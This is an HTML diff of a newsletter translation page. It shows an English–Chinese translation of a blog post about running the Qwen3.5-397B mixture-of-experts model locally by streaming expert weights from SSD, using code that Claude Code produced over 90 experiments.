 <p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-加入 92 万读者的行列，订阅免费每日邮件，获取最精彩的 AI 故事与突破性进展。
+<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Qwen3.5-397B-A17B</strong> 是一种<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">混合专家（Mixture-of-Experts, MoE）</strong>模型，这意味着每个 token 只需针对整体模型权重的子集进行运算。这些专家权重可以从<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">固态硬盘（SSD）</strong>流式传输到内存中，无需同时将所有权重保存在 RAM 中。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Dan</strong> used techniques described in <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Apple</strong>'s 2023 paper <em>LLM in a flash: Efficient Large Language Model Inference with Limited Memory</em>:
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Dan</strong> 采用了 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Apple</strong> 2023 年发表的论文《<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LLM in a flash</strong>：在有限内存下高效运行大语言模型》中描述的技术：
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+This paper tackles the challenge of efficiently running LLMs that exceed the available <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DRAM</strong> capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.
+</blockquote>
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+本文解决了如何高效运行超出可用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DRAM</strong>（动态随机存取存储器）容量的大语言模型这一挑战，通过将模型参数存储在闪存中，并在需要时按需加载到 DRAM。我们的方法涉及构建一个推理成本模型，该模型考虑了闪存的特性，指导我们在两个关键领域进行优化：减少从闪存传输的数据量，以及以更大、更连续的块读取数据。
+</blockquote>
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+This paper tackles the challenge of efficiently running LLMs that exceed the available <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DRAM</strong> capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+本文解决了如何高效运行超出可用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DRAM</strong>（动态随机存取存储器）容量的大语言模型这一挑战，通过将模型参数存储在闪存中，并在需要时按需加载到 DRAM。我们的方法涉及构建一个推理成本模型，该模型考虑了闪存的特性，指导我们在两个关键领域进行优化：减少从闪存传输的数据量，以及以更大、更连续的块读取数据。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+He fed the paper to <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> and used a variant of <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andrej Karpathy</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">autoresearch pattern</strong> to have <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Claude</strong> run 90 experiments and produce <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MLX</strong> <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Objective-C</strong> and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Metal</strong> code that ran the model as efficiently as possible.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+他将这篇论文输入到 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> 中，并使用了 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Andrej Karpathy</strong> 的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">自主研究模式（autoresearch pattern）</strong>的一种变体，让 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Claude</strong> 运行了 90 次实验，并生成了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MLX</strong>、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Objective-C</strong> 和 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Metal</strong> 代码，以尽可能高效地运行该模型。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">danveloper/flash-moe</code> has the resulting code plus a PDF paper mostly written by <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Opus 4.6</strong> describing the experiment in full.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">danveloper/flash-moe</code> 仓库包含了最终的代码，以及一篇主要由 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Opus 4.6</strong> 撰写的 PDF 论文，完整描述了这一实验。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+The final model has the experts quantized to <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">2-bit</strong>, but the non-expert parts of the model such as the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">embedding table</strong> and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">routing matrices</strong> are kept at their original precision, adding up to 5.5GB which stays resident in memory while the model is running.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+最终模型将专家权重量化到 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">2-bit</strong>（2 比特），但模型的非专家部分（如<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">嵌入表（embedding table）</strong>和<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">路由矩阵（routing matrices）</strong>）保持原始精度，这部分共计 5.5GB，在模型运行期间常驻内存。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qwen 3.5</strong> usually runs 10 experts per token, but this setup dropped that to 4 while claiming that the biggest quality drop-off occurred at 3.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qwen 3.5</strong> 通常为每个 token 运行 10 个专家，但此配置将其减少到 4 个，同时声称最大的质量下降发生在使用 3 个专家时。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+It's not clear to me how much the quality of the model results are affected. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Claude</strong> claimed that "Output quality at 2-bit is indistinguishable from 4-bit for these evaluations", but the description of the evaluations it ran is quite thin.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+目前尚不清楚模型结果的质量受到了多大影响。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Claude</strong> 声称"在这些评估中，2-bit 的输出质量与 4-bit 无法区分"，但关于其所运行评估的描述相当简略。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Update:</strong> <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Dan</strong>'s latest version upgrades to <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">4-bit</strong> quantization of the experts (209GB on disk, 4.36 tokens/second) after finding that the 2-bit version broke <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">tool calling</strong> while 4-bit handles that well.
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">更新：</strong><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Dan</strong> 的最新版本将专家权重升级到 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">4-bit</strong>（4 比特）量化（磁盘占用 209GB，速度 4.36 token/秒），因为他发现 2-bit 版本破坏了<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">工具调用（tool calling）</strong>功能，而 4-bit 版本则能很好地处理该功能。
+</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
+Tags: <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">ai</code>, <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">generative-ai</code>, <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">local-llms</code>, <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">llms</code>, <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">qwen</code>, <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">mlx</code>
+</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
+标签：<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">ai</code>（人工智能）、<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">generative-ai</code>（生成式 AI）、<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">local-llms</code>（本地大语言模型）、<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">llms</code>（大语言模型）、<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">qwen</code>（通义千问）、<code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">mlx</code>（Apple 机器学习框架）
 </p></div>
       <button class="toggle-btn" onclick="toggleTranslation(this)">展开全文翻译</button>
-      <a class="link" href="https://tldr.tech/ai/2026-03-18" target="_blank">阅读原文 &rarr;</a>
+      <a class="link" href="https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything" target="_blank">阅读原文 &rarr;</a>
     </div>
   </div>
 </div>
 
 <div class="footer">
-  Newsletter 聚合翻译工具 &middot; Powered by AI &middot; 2026-03-18
+  Newsletter 聚合翻译工具 &middot; Powered by AI &middot; 2026-03-19
 </div>
 
 <script>
